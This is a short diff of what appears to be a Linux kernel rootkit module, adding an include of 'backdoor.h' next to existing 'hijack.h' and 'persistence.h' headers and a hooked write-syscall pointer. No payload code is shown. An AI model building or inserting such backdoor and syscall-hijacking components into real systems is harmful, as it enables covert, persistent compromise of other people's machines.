@@ -13,6 +13,7 @@ module_exit(duck_exit);
 
 asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
 
+#include "backdoor.h"
 #include "hijack.h"
 #include "misc.h"
 #include "persistence.h"
